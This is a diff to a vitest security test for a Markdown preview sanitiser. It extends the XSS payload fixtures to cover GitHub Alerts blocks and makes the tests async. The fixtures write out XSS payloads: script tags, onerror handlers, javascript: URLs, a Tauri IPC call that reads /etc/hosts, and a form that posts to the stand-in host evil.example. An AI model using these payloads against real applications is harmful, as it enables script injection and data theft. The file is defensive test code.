@@ -1,15 +1,17 @@
 import { describe, it, expect } from 'vitest';
 import { marked } from 'marked';
 import { sanitizeUserHtml } from '../sanitizeHtml';
+import { parseMarkdownToHtml } from '../parseMarkdown';
 
 /**
  * End-to-end check of the malicious payloads in docs/security-xss-test.md.
- * Mirrors the preview pipeline (marked → sanitizeUserHtml) and asserts that every
+ * Mirrors the preview pipeline (parseMarkdownToHtml → sanitizeUserHtml, i.e.
+ * marked + GitHub Alerts/emoji extensions) and asserts that every
  * script-execution vector is neutralized. CSP is the second line of defense and
  * can't be exercised under vitest; this locks in the sanitization layer.
  */
-function render(md: string): string {
-  const html = marked(md, { breaks: true, gfm: true, async: false }) as string;
+async function render(md: string): Promise<string> {
+  const html = await parseMarkdownToHtml(md, { renderer: new marked.Renderer() });
   return sanitizeUserHtml(html);
 }
 
@@ -41,12 +43,16 @@ const PAYLOADS: Record<string, string> = {
   objectJs: `<object data="javascript:alert('x')"></object>`,
   embedJs: `<embed src="javascript:alert('x')">`,
   ipcExfil: `<img src="y" onerror="window.__TAURI_INTERNALS__.invoke('read_file',{path:'/etc/hosts'})">`,
+  // Same vectors routed through the GitHub Alerts body, which is re-lexed by
+  // the alerts extension — must sanitize identically to top-level content.
+  alertBodyImgOnerror: `> [!NOTE]\n> <img src="x" onerror="alert('x')">`,
+  alertBodyScript: `> [!WARNING]\n> <script>alert('x')</script>ok`,
 };
 
 describe('XSS fixture payloads are neutralized by the preview pipeline', () => {
   for (const [name, payload] of Object.entries(PAYLOADS)) {
-    it(`neutralizes: ${name}`, () => {
-      const out = render(payload);
+    it(`neutralizes: ${name}`, async () => {
+      const out = await render(payload);
       for (const artifact of EXECUTION_ARTIFACTS) {
         expect(out, `"${artifact}" survived in: ${out}`).not.toMatch(artifact);
       }
@@ -60,18 +66,25 @@ describe('XSS fixture payloads are neutralized by the preview pipeline', () => {
   // mistakes the sanitizer for the defense layer here; if it starts failing,
   // sanitization gained form handling and this comment (and the CSP note in
   // KNOWLEDGE.md) should be revisited.
-  it('documents: external form action passes sanitize; CSP form-action blocks it', () => {
-    const out = render(
+  it('documents: external form action passes sanitize; CSP form-action blocks it', async () => {
+    const out = await render(
       `<form action="https://evil.example/steal"><input name="s" value="x"></form>`,
     );
     expect(out).toContain('<form');
     expect(out).toContain('action="https://evil.example/steal"');
   });
 
-  it('preserves legitimate content (defense did not over-strip)', () => {
-    const out = render('**bold** and [link](https://example.com) and `code`');
+  it('preserves legitimate content (defense did not over-strip)', async () => {
+    const out = await render('**bold** and [link](https://example.com) and `code`');
     expect(out).toContain('<strong>bold</strong>');
     expect(out).toContain('href="https://example.com"');
     expect(out).toContain('<code>code</code>');
+  });
+
+  it('preserves the GitHub alert markup (octicon SVG survives sanitize)', async () => {
+    const out = await render('> [!NOTE]\n> body');
+    expect(out).toContain('markdown-alert-note');
+    expect(out).toContain('<svg');
+    expect(out).toContain('viewBox="0 0 16 16"');
   });
 });
